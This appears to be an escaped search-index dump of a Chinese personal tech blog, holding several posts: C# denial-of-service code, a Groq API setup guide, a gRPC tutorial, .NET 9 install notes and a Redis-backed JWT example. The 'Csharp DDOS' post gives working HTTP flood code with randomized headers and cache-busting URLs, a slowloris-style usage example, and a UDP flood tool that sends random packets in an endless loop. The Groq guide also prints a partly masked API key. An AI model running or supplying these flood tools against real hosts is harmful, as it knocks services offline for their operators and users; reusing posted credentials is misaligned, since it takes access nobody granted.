\u0026#34;only-if-cache\u0026#34; }; List\u0026lt;string\u0026gt; acceptEc = new List\u0026lt;string\u0026gt; { \u0026#34;compress,gzip\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;compress;q=0,5, gzip;q=1.0\u0026#34;, \u0026#34;gzip;q=1.0, indentity; q=0.5, *;q=0\u0026#34; }; List\u0026lt;string\u0026gt; acceptC = new List\u0026lt;string\u0026gt; { \u0026#34;ISO-8859-1\u0026#34;, \u0026#34;utf-8\u0026#34;, \u0026#34;Windows-1251\u0026#34;, \u0026#34;ISO-8859-2\u0026#34;, \u0026#34;ISO-8859-15\u0026#34; }; List\u0026lt;string\u0026gt; bot = ds.AddBots(); string c = cachetype[random.Next(0, cachetype.Count)]; string a = acceptEc[random.Next(0, acceptEc.Count)]; Dictionary\u0026lt;string, string\u0026gt; http_header = new Dictionary\u0026lt;string, string\u0026gt;(); http_header.Add(\u0026#34;User-Agent\u0026#34;, ds.AddUserAgent()[random.Next(0, ds.AddUserAgent().Count)]); http_header.Add(\u0026#34;Cache-Control\u0026#34;, c); http_header.Add(\u0026#34;Accept-Encoding\u0026#34;, a); http_header.Add(\u0026#34;Keep-Alive\u0026#34;, \u0026#34;42\u0026#34;); http_header.Add(\u0026#34;Host\u0026#34;, tgt); http_header.Add(\u0026#34;Referer\u0026#34;, bot[random.Next(0, bot.Count)]); return http_header; } public WebHeaderCollection Header() { Random random = new Random(); List\u0026lt;string\u0026gt; cachetype = new List\u0026lt;string\u0026gt; { \u0026#34;no-cache\u0026#34;, \u0026#34;no-store\u0026#34;, \u0026#34;max-age=\u0026#34; + random.Next(0, 10).ToString(), \u0026#34;max-stale=\u0026#34; + random.Next(0, 100).ToString(), \u0026#34;min-fresh=\u0026#34; + random.Next(0, 10).ToString(), \u0026#34;notransform\u0026#34;, \u0026#34;only-if-cache\u0026#34; }; List\u0026lt;string\u0026gt; acceptEc = new List\u0026lt;string\u0026gt; { \u0026#34;compress,gzip\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;compress;q=0,5, gzip;q=1.0\u0026#34;, \u0026#34;gzip;q=1.0, indentity; q=0.5, *;q=0\u0026#34; }; List\u0026lt;string\u0026gt; acceptC = new List\u0026lt;string\u0026gt; { \u0026#34;ISO-8859-1\u0026#34;, \u0026#34;utf-8\u0026#34;, \u0026#34;Windows-1251\u0026#34;, \u0026#34;ISO-8859-2\u0026#34;, \u0026#34;ISO-8859-15\u0026#34; }; List\u0026lt;string\u0026gt; bot = ds.AddBots(); string c = cachetype[random.Next(0, cachetype.Count)]; string a = acceptEc[random.Next(0, acceptEc.Count)]; WebHeaderCollection http_header = new WebHeaderCollection(); http_header.Add(\u0026#34;User-Agent\u0026#34;, ds.AddUserAgent()[random.Next(0, ds.AddUserAgent().Count)]); http_header.Add(\u0026#34;Cache-Control\u0026#34;, c); http_header.Add(\u0026#34;Accept-Encoding\u0026#34;, a); http_header.Add(\u0026#34;Keep-Alive\u0026#34;, \u0026#34;42\u0026#34;); http_header.Add(\u0026#34;Host\u0026#34;, tgt); http_header.Add(\u0026#34;Referer\u0026#34;, bot[random.Next(0, bot.Count)]); return http_header; } public string RandStr() { Random random = new Random(); List\u0026lt;string\u0026gt; mystr = new List\u0026lt;string\u0026gt;(); for (int x = 0; x \u0026lt; 3; x++) { const string chars = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\u0026#34;; string text = new string(Enumerable.Repeat(chars, random.Next(7, 14)).Select(s =\u0026gt; s[random.Next(s.Length)]).ToArray()); mystr.Add(text); } return string.Join(\u0026#34;\u0026amp;\u0026#34;, mystr); } public string CreateUrl() { return tgt + \u0026#34;?\u0026#34; + RandStr(); } public void Run(string method,int count=1) { try { foreach (var _ in Enumerable.Range(0, count)) // 可以根据实际需求调整循环次数等逻辑，这里简单示例先循环1次 { //string method = new string[] { \u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34; }[new Random().Next(0, 2)]; // 先创建包含完整请求URL（包含参数等）的Uri对象 Uri requestUri = new Uri(CreateUrl()); HttpWebRequest reqter; if (ssl) { reqter = (HttpWebRequest)WebRequest.Create(requestUri); } else { reqter = (HttpWebRequest)WebRequest.Create(requestUri); } reqter.Method = method; using (WebResponse response = reqter.GetResponse()) { // 可以在这里添加对响应内容的处理逻辑，当前为空 Console.WriteLine(response.ContentLength.ToString()); } } } catch (Exception e) { Console.WriteLine(e.Message); } } } 使用 string target = \u0026#34;xxx\u0026#34;;// 替换为实际目标IP或域名 int port = xxx; float timeout = 5.0f; int threads = 10; int sleepTime = 100; Pyslow pyslow = new Pyslow(target, port, timeout, threads, sleepTime); try { pyslow.DoConnection(); } catch (Exception ex) { Console.WriteLine($\u0026#34;发生异常: {ex.Message}\u0026#34;); } //// 创建Requester类的实例，传入目标URL //Requester requester = new Requester(\u0026#34;http://xxx/index.html\u0026#34;); // http://xxx:16552 //try //{ // // 调用Run方法来执行发送请求等相关操作 // requester.Run(\u0026#34;GET\u0026#34;, 100);//POST //} //catch (Exception ex) //{ // Console.WriteLine($\u0026#34;发生异常: {ex.Message}\u0026#34;); //} ","permalink":"https://qfsyso.github.io/posts/csharp-ddos/","summary":"UDP 包发 using System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class Program { static void Main(string[] args) { Console.Clear(); Console.WriteLine(\u0026#34;UDP Flood Attack\u0026#34;); Console.WriteLine(); // 获取目标 IP 和端口 Console.Write(\u0026#34;IP Target : \u0026#34;); string ip = Console.ReadLine(); Console.Write(\u0026#34;Port : \u0026#34;); int port = int.Parse(Console.ReadLine()); // 准备 UDP 客户端 UdpClient udpClient = new UdpClient(); byte[] bytes = new byte[1490]; new Random().NextBytes(bytes); // 生成随机字节数据 // 模拟进度条 Console.Clear(); Console.WriteLine(\u0026#34;Attack Starting\u0026#34;); ShowProgressBar(); // 开始发送 UDP 数据包 int sent = 0; while (true) { try { udpClient.","title":"Csharp DDOS"},{"content":"llama-3.3-70b-versatile Groq API 免费使用教程 第一步：获取 API 访问 https://console.groq.com/ 完成注册并申请 API -\u0026gt; googlemail 保存获得的 API 密钥 第二步：配置 NextChat 打开 https://app.nextchat.dev/ https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web 在左侧设置中填入： 设置-\u0026gt;模型服务商-\u0026gt;Google 设置-\u0026gt;自定义接口\n模型(model) llama-3.3-70b-versatile 接口地址：https://api.groq.com/openai/ API Key：填入之前获取的密钥 自定义模型：llama-3.3-70b-versatile 主要优势 响应速度：200 Token/秒 性能表现：接近 GPT-4.0 水平 完全免费使用 使用限制 每分钟限额：6000 Token 每日 API 调用：14000 次 足够普通用户日常使用 gsk_U2MI0vooKS4JyCtmNMLHWGdyxxxfqo\n提问：你是什么大模型 回答： 我是人工智能模型，特别是一种大型语言模型。我的主要功能是理解和生成类似人类的文本。我的训练数据包括了大量的文本信息，这使我能够学习语言的模式和结构，并根据这个学习生成类似人类的回答。 我的能力包括但不限于： 回答问题：我可以根据我的训练数据回答广泛的题目，从科学和历史到娱乐和文化。 生成文本：我可以根据给定的提示或主题生成文本，包括文章、故事、诗歌等。 翻译：我可以进行语言之间的翻译，例如从英语翻译到西班牙语、法语、德语等。 摘要：我可以将长篇文本摘要为简短的摘要，帮助用户快速理解主要内容。 对话：我可以与用户进行对话，回答问题，提供信息，甚至参与辩论。 我的优势在于能够快速处理和生成大量信息，但是我的能力也受到训练数据的限制。因此，我可能无法总是提供完全准确或最新的信息。然而，我会尽力提供最好的答案和帮助。 ","permalink":"https://qfsyso.github.io/posts/llama-3.3-70b-versatile/","summary":"llama-3.3-70b-versatile Groq API 免费使用教程 第一步：获取 API 访问 https://console.groq.com/ 完成注册并申请 API -\u0026gt; googlemail 保存获得的 API 密钥 第二步：配置 NextChat 打开 https://app.nextchat.dev/ https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web 在左侧设置中填入： 设置-\u0026gt;模型服务商-\u0026gt;Google 设置-\u0026gt;自定义接口\n模型(model) llama-3.3-70b-versatile 接口地址：https://api.groq.com/openai/ API Key：填入之前获取的密钥 自定义模型：llama-3.3-70b-versatile 主要优势 响应速度：200 Token/秒 性能表现：接近 GPT-4.0 水平 完全免费使用 使用限制 每分钟限额：6000 Token 每日 API 调用：14000 次 足够普通用户日常使用 gsk_U2MI0vooKS4JyCtmNMLHWGdyxxxfqo\n提问：你是什么大模型 回答： 我是人工智能模型，特别是一种大型语言模型。我的主要功能是理解和生成类似人类的文本。我的训练数据包括了大量的文本信息，这使我能够学习语言的模式和结构，并根据这个学习生成类似人类的回答。 我的能力包括但不限于： 回答问题：我可以根据我的训练数据回答广泛的题目，从科学和历史到娱乐和文化。 生成文本：我可以根据给定的提示或主题生成文本，包括文章、故事、诗歌等。 翻译：我可以进行语言之间的翻译，例如从英语翻译到西班牙语、法语、德语等。 摘要：我可以将长篇文本摘要为简短的摘要，帮助用户快速理解主要内容。 对话：我可以与用户进行对话，回答问题，提供信息，甚至参与辩论。 我的优势在于能够快速处理和生成大量信息，但是我的能力也受到训练数据的限制。因此，我可能无法总是提供完全准确或最新的信息。然而，我会尽力提供最好的答案和帮助。 ","title":"llama-3.3-70b-versatile"},{"content":"gRPC（Google Remote Procedure Call） 是一个高性能、开源和通用的RPC框架，最初由Google开发。它使用HTTP/2作为传输协议，并默认采用Protocol Buffers作为接口定义语言（IDL）和消息格式。gRPC支持多种编程语言，包括但不限于C++、Java、Python、Go、Ruby、C#、Node.js、PHP等。\ngRPC 特点： 高效的数据交换：通过使用Protocol Buffers（Protobuf），gRPC能够以二进制形式序列化和反序列化数据，这比JSON或XML等文本格式更紧凑、更快。 双向流式通信：gRPC支持四种不同的调用类型：简单RPC、服务器端流式RPC、客户端流式RPC以及双向流式RPC。这使得开发者可以灵活选择最适合其应用场景的通信模式。 HTTP/2：gRPC基于HTTP/2构建，这意味着它可以利用HTTP/2提供的特性，如多路复用、头部压缩、流量控制等，来提高性能和可靠性。 跨平台支持：gRPC可以在多种环境中运行，包括云服务、本地部署、移动端等，并且对各种编程语言都有良好的支持，便于构建跨平台的应用程序。 插件系统：gRPC提供了一个插件系统，允许用户自定义代码生成逻辑，或者添加额外的功能，如认证、日志记录、监控等。 强大的社区和生态系统：由于它是Google的产品并且被广泛采用，因此拥有一个活跃的社区和丰富的第三方库与工具生态系统。\ngRPC 场景： gRPC的使用场景非常广泛，尤其适用于需要高效、可靠和高性能通信的应用程序。以下是gRPC的一些典型使用场景：\n1. 微服务架构 服务间通信：在微服务架构中，不同的服务可能使用不同的编程语言实现，并且需要高效地相互交流。gRPC以其跨语言支持和高效的二进制协议（Protocol Buffers），成为构建微服务之间通信层的理想选择。 负载均衡：gRPC原生支持客户端负载均衡，可以帮助分散请求到多个服务实例上，提高系统的可用性和性能。\n2. 实时应用程序 双向流式通信：gRPC的双向流特性非常适合用于实时应用程序，如聊天应用、在线游戏、视频会议等，其中客户端和服务端需要持续地交换数据。 实时数据推送：对于需要从服务器向客户端推送实时更新的应用，例如股票行情、社交媒体通知、物联网设备状态更新等，gRPC的服务端流式RPC可以有效地实现这一需求。\n3. 移动应用与后端通信 轻量级性能：由于其高效的序列化机制和较低的网络开销，gRPC特别适合移动应用与后端服务器之间的通信，特别是在网络条件不佳的情况下，能够减少电量消耗并提高响应速度。 快速开发：gRPC自动生成客户端和服务端代码的能力，大大简化了开发流程，尤其是在多平台开发环境中，减少了重复劳动。\n4. 跨语言通信 多语言环境：gRPC支持多种编程语言，使得它非常适合用于跨语言通信的场景。不同团队或项目可以使用各自熟悉的技术栈，同时通过gRPC进行无缝集成。 异构系统集成：当需要将遗留系统与现代应用集成时，gRPC的跨语言能力可以帮助桥接这些系统，促进信息的流动和交互。\n5. 分布式系统 节点间通信：在分布式系统中，各节点之间的通信是至关重要的。gRPC提供的高效率和可靠性使其成为分布式计算、任务分发、集群管理等场景下的首选通信框架。 数据同步：gRPC可以用来实现实时的数据同步，确保分布式系统中的所有节点都拥有最新的数据副本。\n6. 容器化环境 服务发现：在Kubernetes等容器编排平台上，gRPC可以通过服务发现机制自动找到其他服务，简化了容器间的通信配置。 轻量级部署：gRPC的轻量级特性和对多语言的支持，使其非常适合容器化部署，有助于提升资源利用率和服务扩展性。\n7. API后端服务 高性能API：许多大型互联网公司使用gRPC来构建其API后端服务，因为它提供了高性能、可扩展性和易于维护的方式来处理客户端请求。 类型安全：gRPC的IDL（接口定义语言）定义了严格的服务契约，保证了服务端和客户端之间的调用是类型安全的，减少了运行时错误的发生。\n8. 物联网（IoT） 低资源消耗：gRPC的高效性能和紧凑的消息格式，使得它成为连接IoT设备和传感器的理想通信协议，能够在有限的计算和网络资源下提供可靠的通信。 实时监控与控制：gRPC的流式API非常适合用于实时监控和控制IoT设备，如智能家居系统、工业自动化等场景。\n9. 大数据和机器学习 数据传输：在大数据处理和机器学习训练过程中，gRPC可以用来高效地传输大量数据，特别是当数据需要在不同的计算节点之间传递时。 模型服务：gRPC常被用于构建机器学习模型的服务化接口，允许客户端以高效的方式查询模型预测结果。 综上所述，gRPC是一个灵活且强大的通信框架，适用于各种需要高效、可靠通信的场景。无论是构建复杂的微服务架构，还是简单的客户端-服务器应用，gRPC都能提供显著的优势。\nNode.js gRPC 创建和调用 gRPC 服务。包括服务器和客户端实现。\n1. 安装必要的包 在项目目录下执行以下命令安装 gRPC 相关依赖：\nnpm install @grpc/grpc-js @grpc/proto-loader 2. 创建 proto 文件 创建一个文件 example.proto 定义 gRPC 服务和消息结构：\nproto\nsyntax = \u0026#34;proto3\u0026#34;; service ExampleService { rpc SayHello (HelloRequest) returns (HelloReply); } message HelloRequest { string name = 1; } message HelloReply { string message = 1; } 3. 实现 gRPC 服务器 创建一个文件 server.js，实现 gRPC 服务：\nconst grpc = require(\u0026#39;@grpc/grpc-js\u0026#39;); const protoLoader = require(\u0026#39;@grpc/proto-loader\u0026#39;); const path = require(\u0026#39;path\u0026#39;); // 加载 proto 文件 const PROTO_PATH = path.join(__dirname, \u0026#39;example.proto\u0026#39;); const packageDefinition = protoLoader.loadSync(PROTO_PATH, { keepCase: true, longs: String, enums: String, defaults: true, oneofs: true, }); const exampleProto = grpc.loadPackageDefinition(packageDefinition); // 实现 SayHello 方法 function sayHello(call, callback) { const name = call.request.name; callback(null, { message: `Hello, ${name}!` }); } // 创建和启动 gRPC 服务器 function main() { const server = new grpc.Server(); server.addService(exampleProto.ExampleService.service, { SayHello: sayHello }); const port = \u0026#39;127.0.0.1:50051\u0026#39;; server.bindAsync(port, grpc.ServerCredentials.createInsecure(), () =\u0026gt; { console.log(`Server running at ${port}`); // 不再需要调用 server.start() }); } main(); 4. 实现 gRPC 客户端 创建一个文件 client.js，调用 gRPC 服务：\nconst grpc = require(\u0026#39;@grpc/grpc-js\u0026#39;); const protoLoader = require(\u0026#39;@grpc/proto-loader\u0026#39;); const path = require(\u0026#39;path\u0026#39;); // 加载 proto 文件 const PROTO_PATH = path.join(__dirname, \u0026#39;example.proto\u0026#39;); const packageDefinition = protoLoader.loadSync(PROTO_PATH, { keepCase: true, longs: String, enums: String, defaults: true, oneofs: true, }); const exampleProto = grpc.loadPackageDefinition(packageDefinition); // 创建客户端并调用服务 function main() { const client = new exampleProto.ExampleService(\u0026#39;127.0.0.1:50051\u0026#39;, grpc.credentials.createInsecure()); const name = \u0026#39;World\u0026#39;; client.SayHello({ name }, (error, response) =\u0026gt; { if (error) { console.error(\u0026#39;Error:\u0026#39;, error); } else { console.log(\u0026#39;Server Response:\u0026#39;, response.message); } }); } main(); 5. 运行示例 启动服务器：\nnode server.js 在另一个终端窗口运行客户端：\nnode client.js 在客户端终端看到以下输出：\nServer Response: Hello, World! proto 文件：用于定义服务和消息结构。 服务器：通过 grpc.Server 创建并实现服务方法。 客户端：通过 grpc.Client 调用服务并处理响应。 可以基于此示例扩展自己的 gRPC 服务功能。\nC#编写的 gRPC 客户端 1. 添加依赖 在的 C# 项目中，添加以下 NuGet 包：\ndotnet add package Grpc.Net.Client dotnet add package Grpc.Tools dotnet add package google.protobuf 2. 配置 example.proto 将 example.proto 文件添加到的 C# 项目中，并编辑 .csproj 文件以生成客户端代码。添加以下内容到 节点中：\n\u0026lt;ItemGroup\u0026gt; \u0026lt;Protobuf Include=\u0026#34;example.proto\u0026#34; GrpcServices=\u0026#34;Client\u0026#34; /\u0026gt; \u0026lt;/ItemGroup\u0026gt; 这将告诉编译器根据 example.proto 文件生成 C# 客户端代码。\n3. 编写客户端代码 创建一个文件 Program.cs，内容如下：\nusing Grpc.Net.Client; using Example; // 确保命名空间与 example.proto 中的 package 定义一致 class Program { static async Task Main(string[] args) { // 创建 gRPC 通道 using var channel = GrpcChannel.ForAddress(\u0026#34;http://127.0.0.1:50051\u0026#34;); // 创建客户端 var client = new ExampleService.ExampleServiceClient(channel); // 调用服务方法 var request = new HelloRequest { Name = \u0026#34;World\u0026#34; }; var reply = await client.SayHelloAsync(request); // 输出服务响应 Console.WriteLine(\u0026#34;Server Response: \u0026#34; + reply.Message); } } 运行客户端 确保 Node.js gRPC 服务器正在运行。 在的 C# 项目目录中运行：\ndotnet run 如果一切正常，看到以下输出：\nServer Response: Hello, World!\nProto 文件的路径配置： 确保 example.proto 中的 package 定义为 Example，并与 C# 命名空间一致。\n生成的客户端代码： 根据 example.proto，工具会生成 ExampleServiceClient 和 HelloRequest/HelloReply 类。只需调用这些类与服务通信。\ngRPC 通道： 使用 GrpcChannel.ForAddress 创建一个到服务器的连接。\n异步调用： gRPC 方法通常是异步的，使用 await 来调用它们。\n","permalink":"https://qfsyso.github.io/posts/grpc/","summary":"gRPC（Google Remote Procedure Call） 是一个高性能、开源和通用的RPC框架，最初由Google开发。它使用HTTP/2作为传输协议，并默认采用Protocol Buffers作为接口定义语言（IDL）和消息格式。gRPC支持多种编程语言，包括但不限于C++、Java、Python、Go、Ruby、C#、Node.js、PHP等。\ngRPC 特点： 高效的数据交换：通过使用Protocol Buffers（Protobuf），gRPC能够以二进制形式序列化和反序列化数据，这比JSON或XML等文本格式更紧凑、更快。 双向流式通信：gRPC支持四种不同的调用类型：简单RPC、服务器端流式RPC、客户端流式RPC以及双向流式RPC。这使得开发者可以灵活选择最适合其应用场景的通信模式。 HTTP/2：gRPC基于HTTP/2构建，这意味着它可以利用HTTP/2提供的特性，如多路复用、头部压缩、流量控制等，来提高性能和可靠性。 跨平台支持：gRPC可以在多种环境中运行，包括云服务、本地部署、移动端等，并且对各种编程语言都有良好的支持，便于构建跨平台的应用程序。 插件系统：gRPC提供了一个插件系统，允许用户自定义代码生成逻辑，或者添加额外的功能，如认证、日志记录、监控等。 强大的社区和生态系统：由于它是Google的产品并且被广泛采用，因此拥有一个活跃的社区和丰富的第三方库与工具生态系统。\ngRPC 场景： gRPC的使用场景非常广泛，尤其适用于需要高效、可靠和高性能通信的应用程序。以下是gRPC的一些典型使用场景：\n1. 微服务架构 服务间通信：在微服务架构中，不同的服务可能使用不同的编程语言实现，并且需要高效地相互交流。gRPC以其跨语言支持和高效的二进制协议（Protocol Buffers），成为构建微服务之间通信层的理想选择。 负载均衡：gRPC原生支持客户端负载均衡，可以帮助分散请求到多个服务实例上，提高系统的可用性和性能。\n2. 实时应用程序 双向流式通信：gRPC的双向流特性非常适合用于实时应用程序，如聊天应用、在线游戏、视频会议等，其中客户端和服务端需要持续地交换数据。 实时数据推送：对于需要从服务器向客户端推送实时更新的应用，例如股票行情、社交媒体通知、物联网设备状态更新等，gRPC的服务端流式RPC可以有效地实现这一需求。\n3. 移动应用与后端通信 轻量级性能：由于其高效的序列化机制和较低的网络开销，gRPC特别适合移动应用与后端服务器之间的通信，特别是在网络条件不佳的情况下，能够减少电量消耗并提高响应速度。 快速开发：gRPC自动生成客户端和服务端代码的能力，大大简化了开发流程，尤其是在多平台开发环境中，减少了重复劳动。\n4. 跨语言通信 多语言环境：gRPC支持多种编程语言，使得它非常适合用于跨语言通信的场景。不同团队或项目可以使用各自熟悉的技术栈，同时通过gRPC进行无缝集成。 异构系统集成：当需要将遗留系统与现代应用集成时，gRPC的跨语言能力可以帮助桥接这些系统，促进信息的流动和交互。\n5. 分布式系统 节点间通信：在分布式系统中，各节点之间的通信是至关重要的。gRPC提供的高效率和可靠性使其成为分布式计算、任务分发、集群管理等场景下的首选通信框架。 数据同步：gRPC可以用来实现实时的数据同步，确保分布式系统中的所有节点都拥有最新的数据副本。\n6. 容器化环境 服务发现：在Kubernetes等容器编排平台上，gRPC可以通过服务发现机制自动找到其他服务，简化了容器间的通信配置。 轻量级部署：gRPC的轻量级特性和对多语言的支持，使其非常适合容器化部署，有助于提升资源利用率和服务扩展性。\n7. API后端服务 高性能API：许多大型互联网公司使用gRPC来构建其API后端服务，因为它提供了高性能、可扩展性和易于维护的方式来处理客户端请求。 类型安全：gRPC的IDL（接口定义语言）定义了严格的服务契约，保证了服务端和客户端之间的调用是类型安全的，减少了运行时错误的发生。\n8. 物联网（IoT） 低资源消耗：gRPC的高效性能和紧凑的消息格式，使得它成为连接IoT设备和传感器的理想通信协议，能够在有限的计算和网络资源下提供可靠的通信。 实时监控与控制：gRPC的流式API非常适合用于实时监控和控制IoT设备，如智能家居系统、工业自动化等场景。\n9. 大数据和机器学习 数据传输：在大数据处理和机器学习训练过程中，gRPC可以用来高效地传输大量数据，特别是当数据需要在不同的计算节点之间传递时。 模型服务：gRPC常被用于构建机器学习模型的服务化接口，允许客户端以高效的方式查询模型预测结果。 综上所述，gRPC是一个灵活且强大的通信框架，适用于各种需要高效、可靠通信的场景。无论是构建复杂的微服务架构，还是简单的客户端-服务器应用，gRPC都能提供显著的优势。\nNode.js gRPC 创建和调用 gRPC 服务。包括服务器和客户端实现。\n1. 安装必要的包 在项目目录下执行以下命令安装 gRPC 相关依赖：\nnpm install @grpc/grpc-js @grpc/proto-loader 2.","title":"gRPC"},{"content":".net9 引入了扩展类型特性，允许开发者扩展实例成员、静态成员以及属性成员，打破了以往只能通过静态类定义扩展方法的限制；params 关键字不再局限于数组类型，可与多种集合类型一起使用；新增 System.Threading.Lock 类型用于线程同步，改进了线程同步机制；异常处理速度大幅提升，环路性能也有所提高，动态 PGO 降低了类型检查成本，RyuJIT 编译器内联更通用的方法以减少方法调用开销等. linq新增了 CountBy 和 AggregateBy 方法，可通过键进行状态聚合，无需通过 GroupBy 进行中间分组，提高了数据查询的效率和灵活性. 引入了 CryptographicOperations 类型中的新的一次性哈希方法，支持最新的加密标准，并新增了一些加密相关的 API；强化了安全机制，如引入更强大的身份验证和授权机制，支持 OAuth 2.0 和 OpenID Connect 等，还通过 AI 驱动的安全功能实现实时威胁检测\nDebian 12 安装.NET 9 添加 Microsoft 包签名密钥和包存储库： 打开终端，运行以下命令：\nwget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb sudo dpkg -i packages-microsoft-prod.deb rm packages-microsoft-prod.deb 安装.NET SDK： 如果需要开发.NET 应用程序，可安装.NET SDK，运行以下命令：\nsudo apt-get update \u0026amp;\u0026amp; \\ sudo apt-get install -y dotnet-sdk-9.0 安装.NET 运行时： 如果只需要运行.NET 应用程序，可安装.NET 运行时。建议安装ASP.NET Core 运行时，因为它包含了.NET 和ASP.NET Core 运行时，在终端中运行以下命令：\nsudo apt-get update \u0026amp;\u0026amp; \\ sudo apt-get install -y aspnetcore-runtime-9.0 作为ASP.NET Core 运行时的替代方法 也可以安装不包含ASP.NET Core 支持的.NET 运行时，将上述命令中的aspnetcore-runtime-9.0替换为dotnet-runtime-9.0，即：\nsudo apt-get install -y dotnet-runtime-9.0 验证是否安装成功 dotnet --version old .NET8 sudo apt update sudo apt upgrade -y wget -O 下载并以不同的文件名保存 添加 Microsoft 包仓库 wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb sudo dpkg -i packages-microsoft-prod.deb sudo apt update 2 .net8 sudo apt install -y dotnet-sdk-8.0 wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb sudo dpkg -i packages-microsoft-prod.deb # 8 sudo apt-get update; \\ sudo apt-get install -y apt-transport-https \u0026amp;\u0026amp; \\ sudo apt-get update \u0026amp;\u0026amp; \\ sudo apt-get install -y dotnet-sdk-8.0 .NET8升级.NET9 打开项目 右键属性 目标框架 .NET 8.0 改为9.0 nuget update\n","permalink":"https://qfsyso.github.io/posts/asp.net-core-9.0/","summary":".net9 引入了扩展类型特性，允许开发者扩展实例成员、静态成员以及属性成员，打破了以往只能通过静态类定义扩展方法的限制；params 关键字不再局限于数组类型，可与多种集合类型一起使用；新增 System.Threading.Lock 类型用于线程同步，改进了线程同步机制；异常处理速度大幅提升，环路性能也有所提高，动态 PGO 降低了类型检查成本，RyuJIT 编译器内联更通用的方法以减少方法调用开销等. linq新增了 CountBy 和 AggregateBy 方法，可通过键进行状态聚合，无需通过 GroupBy 进行中间分组，提高了数据查询的效率和灵活性. 引入了 CryptographicOperations 类型中的新的一次性哈希方法，支持最新的加密标准，并新增了一些加密相关的 API；强化了安全机制，如引入更强大的身份验证和授权机制，支持 OAuth 2.0 和 OpenID Connect 等，还通过 AI 驱动的安全功能实现实时威胁检测\nDebian 12 安装.NET 9 添加 Microsoft 包签名密钥和包存储库： 打开终端，运行以下命令：\nwget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb sudo dpkg -i packages-microsoft-prod.deb rm packages-microsoft-prod.deb 安装.NET SDK： 如果需要开发.NET 应用程序，可安装.NET SDK，运行以下命令：\nsudo apt-get update \u0026amp;\u0026amp; \\ sudo apt-get install -y dotnet-sdk-9.0 安装.NET 运行时： 如果只需要运行.NET 应用程序，可安装.NET 运行时。建议安装ASP.NET Core 运行时，因为它包含了.NET 和ASP.NET Core 运行时，在终端中运行以下命令：","title":"ASP.NET Core 9.0"},{"content":" Study Tools AI Hexo Fun Game ","permalink":"https://qfsyso.github.io/posts/navigation/","summary":" Study Tools AI Hexo Fun Game ","title":" Navigation"},{"content":"Redis JWT 在 .NET 中使用 Redis 来存储 JWT（JSON Web Token）可以通过多种方式实现， 例如在用户登录时将生成的 JWT 存储在 Redis 中以便于后续验证和管理。\n实现步骤\n引入依赖 确保你的项目引入了以下必要的 NuGet 包：\nMicrosoft.AspNetCore.Authentication.JwtBearer：用于 JWT 身份验证。 StackExchange.Redis：用于与 Redis 通信。\ndotnet add package Microsoft.AspNetCore.Authentication.JwtBearer dotnet add package StackExchange.Redis 配置 Redis 客户端 设置 Redis 的连接和操作。\n生成 JWT 根据用户信息生成 JWT 并将其存储到 Redis。\n验证 JWT 在验证阶段从 Redis 检查 token 是否有效。\n实现 Token 的失效机制 利用 Redis 的 TTL（过期时间）特性来管理 token 的生命周期。\n代码实现 1. 配置 Redis 客户端 在 Program.cs 或 Startup.cs 中配置 Redis 和 JWT 身份验证：\nusing Microsoft.AspNetCore.Authentication.JwtBearer; using Microsoft.Extensions.DependencyInjection; using Microsoft.IdentityModel.Tokens; using StackExchange.Redis; using System.Text; var builder = WebApplication.CreateBuilder(args); // Redis 配置 builder.Services.AddSingleton\u0026lt;IConnectionMultiplexer\u0026gt;(sp =\u0026gt; ConnectionMultiplexer.Connect(\u0026#34;localhost:6379\u0026#34;)); // 替换为你的 Redis 地址 // JWT 配置 var key = \u0026#34;YourSecretKeyForJwt\u0026#34;; // 替换为你的密钥 builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme) .AddJwtBearer(options =\u0026gt; { options.TokenValidationParameters = new TokenValidationParameters { ValidateIssuerSigningKey = true, IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(key)), ValidateIssuer = false, ValidateAudience = false }; }); builder.Services.AddAuthorization(); var app = builder.Build(); app.UseAuthentication(); app.UseAuthorization(); app.MapControllers(); app.Run(); 2. 生成和存储 JWT 在 Controller 中生成 JWT 并将其存储到 Redis。\nusing Microsoft.AspNetCore.Mvc; using Microsoft.IdentityModel.Tokens; using StackExchange.Redis; using System.IdentityModel.Tokens.Jwt; using System.Security.Claims; using System.Text; [ApiController] [Route(\u0026#34;api/[controller]\u0026#34;)] public class AuthController : ControllerBase { private readonly IConnectionMultiplexer _redis; private readonly string _jwtKey = \u0026#34;YourSecretKeyForJwt\u0026#34;; // 替换为你的密钥 public AuthController(IConnectionMultiplexer redis) { _redis = redis; } [HttpPost(\u0026#34;login\u0026#34;)] public IActionResult Login(string username) { // 创建 JWT token var claims = new[] { new Claim(ClaimTypes.Name, username) }; var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_jwtKey)); var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256); var token = new JwtSecurityToken( claims: claims, expires: DateTime.UtcNow.AddHours(1), signingCredentials: creds); var jwt = new JwtSecurityTokenHandler().WriteToken(token); // 将 token 存储到 Redis var db = _redis.GetDatabase(); db.StringSet($\u0026#34;jwt:{username}\u0026#34;, jwt, TimeSpan.FromHours(1)); return Ok(new { token = jwt }); } } 3. 验证 JWT 在中间件或验证逻辑中从 Redis 检查 JWT 是否有效。\n[HttpGet(\u0026#34;validate\u0026#34;)] public IActionResult ValidateToken() { var authHeader = Request.Headers[\u0026#34;Authorization\u0026#34;].ToString(); if (string.IsNullOrEmpty(authHeader) || !authHeader.StartsWith(\u0026#34;Bearer \u0026#34;)) return Unauthorized(); var token = authHeader.Replace(\u0026#34;Bearer \u0026#34;, \u0026#34;\u0026#34;); var username = User.Identity?.Name; var db = _redis.GetDatabase(); var storedToken = db.StringGet($\u0026#34;jwt:{username}\u0026#34;); if (storedToken.IsNullOrEmpty || storedToken != token) return Unauthorized(); return Ok(\u0026#34;Token is 